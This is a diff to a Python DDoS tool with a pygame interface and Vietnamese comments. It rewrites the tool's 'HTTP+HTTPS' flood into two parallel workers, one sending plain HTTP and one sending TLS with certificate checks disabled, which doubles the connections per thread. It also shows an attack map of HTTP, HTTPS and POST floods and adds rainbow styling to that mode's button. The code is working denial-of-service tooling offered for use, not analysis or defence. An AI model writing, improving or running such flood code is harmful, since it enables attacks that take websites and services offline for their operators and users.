@@ -17,6 +17,7 @@ import gc
 import sys
 import math
 import os
+import colorsys
 
 # ── Fix #11: lưu GC threshold gốc trước khi tune ────────────────────────────
 _GC_DEFAULT = gc.get_threshold()   # (700, 10, 10) mặc định CPython
@@ -373,38 +374,53 @@ def _garbage(host, port, stats, stop_ev):
         except Exception:
             _inc(stats, "errors")
 
-def _http_https_flood(host, port, stats, stop_ev):
+def _http_https_combined(host, port, stats, stop_ev):
     """
-    Mixed mode: mỗi connection random chọn HTTP hoặc HTTPS.
-    Port 443 → thiên HTTPS hơn; port khác → 50/50.
+    Kết hợp HTTP + HTTPS cùng lúc trong 1 thread:
+    spawn 2 sub-worker chạy song song — 1 HTTP thuần, 1 HTTPS TLS.
+    Mỗi main thread → 2 connection thực tế cùng lúc.
     """
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode    = ssl.CERT_NONE
     try: ctx.set_ciphers("ALL:@SECLEVEL=0")
     except: pass
-    use_tls_bias = 0.85 if port == 443 else 0.5
-    while not stop_ev.is_set():
-        raw = None
-        try:
-            raw = _make_socket(); raw.settimeout(2); raw.connect((host, port))
-            if random.random() < use_tls_bias:
-                s = ctx.wrap_socket(raw, server_hostname=host)
-                method  = random.choice(["GET", "GET", "POST"])
-                payload = _req(host, keep=True, method=method)
+
+    def _http_worker():
+        while not stop_ev.is_set():
+            s = None
+            try:
+                s = _make_socket(); s.settimeout(2); s.connect((host, port))
+                payload = _req(host, keep=True, method=random.choice(["GET","GET","POST"]))
+                if not _send_keepalive(s, payload, 200, stats, stop_ev):
+                    _inc(stats, "errors")
+            except Exception:
+                _inc(stats, "errors")
+            finally:
+                if s:
+                    try: s.close()
+                    except: pass
+
+    def _https_worker():
+        while not stop_ev.is_set():
+            raw = None
+            try:
+                raw = _make_socket(); raw.settimeout(2); raw.connect((host, port))
+                s   = ctx.wrap_socket(raw, server_hostname=host)
+                payload = _req(host, keep=True, method=random.choice(["GET","GET","POST"]))
                 if not _send_keepalive(s, payload, 150, stats, stop_ev):
                     _inc(stats, "errors")
-            else:
-                method  = random.choice(["GET", "GET", "GET", "POST"])
-                payload = _req(host, keep=True, method=method)
-                if not _send_keepalive(raw, payload, 200, stats, stop_ev):
-                    _inc(stats, "errors")
-        except Exception:
-            _inc(stats, "errors")
-        finally:
-            if raw:
-                try: raw.close()
-                except: pass
+            except Exception:
+                _inc(stats, "errors")
+            finally:
+                if raw:
+                    try: raw.close()
+                    except: pass
+
+    t1 = threading.Thread(target=_http_worker,  daemon=True)
+    t2 = threading.Thread(target=_https_worker, daemon=True)
+    t1.start(); t2.start()
+    t1.join();  t2.join()
 
 def _check_proxy(host, port, timeout=3):
     """Test kết nối TCP tới proxy — trả về True/False."""
@@ -416,7 +432,7 @@ def _check_proxy(host, port, timeout=3):
         return False
 
 ATTACK_MAP = {
-    "HTTP+HTTPS":   _http_https_flood,
+    "HTTP+HTTPS":   _http_https_combined,
     "HTTP Flood":   _http_flood,
     "HTTPS Flood":  _https_flood,
     "POST Flood":   _post_flood,
@@ -533,6 +549,23 @@ def draw_text_glow(surf, text, font, color, pos, glow_color=None, glow_r=4):
     surf.blit(gs, (0, 0))
     surf.blit(font.render(text, True, color), (cx, cy))
 
+def draw_rainbow_text(surf, text, font, pos, speed=1.8, char_offset=0.07):
+    """Vẽ text cầu vồng lấp lánh — mỗi ký tự 1 màu HSV khác nhau, cycle theo time."""
+    x, y = pos
+    t = time.time() * speed
+    for i, ch in enumerate(text):
+        hue = (t + i * char_offset) % 1.0
+        r, g, b = colorsys.hsv_to_rgb(hue, 1.0, 1.0)
+        col  = (int(r*255), int(g*255), int(b*255))
+        # glow nhẹ
+        gc2  = (int(r*180), int(g*180), int(b*180))
+        gs   = font.render(ch, True, (*gc2, 60))
+        gsurf = pygame.Surface((font.size(ch)[0]+4, font.get_height()+4), pygame.SRCALPHA)
+        gsurf.blit(font.render(ch, True, (*gc2, 50)), (2, 2))
+        surf.blit(gsurf, (x-2, y-2))
+        surf.blit(font.render(ch, True, col), (x, y))
+        x += font.size(ch)[0]
+
 def draw_circuit_bg(surf, seed=42):
     rng = random.Random(seed)
     for _ in range(80):
@@ -631,8 +664,12 @@ class ModeCard:
         pygame.draw.rect(surf, border, self.rect, 1, border_radius=6)
         lyr_col = C_GREEN if self.layer == "L7" else C_CYAN
         surf.blit(fm.render(self.layer, True, lyr_col), (x+6, y+4))
-        ncol = C_RED_GLOW if (self.selected or self.hover) else C_FG
-        surf.blit(fn.render(self.name, True, ncol), (x+6, y+h//2 - fn.get_height()//2))
+        ny = y + h//2 - fn.get_height()//2
+        if self.name == "HTTP+HTTPS":
+            draw_rainbow_text(surf, self.name, fn, (x+6, ny), speed=1.8, char_offset=0.09)
+        else:
+            ncol = C_RED_GLOW if (self.selected or self.hover) else C_FG
+            surf.blit(fn.render(self.name, True, ncol), (x+6, ny))
         ss = fm.render(self.stars, True, C_YELLOW if self.selected else C_DIM)
         surf.blit(ss, (x+w-ss.get_width()-6, y+h-ss.get_height()-4))
 
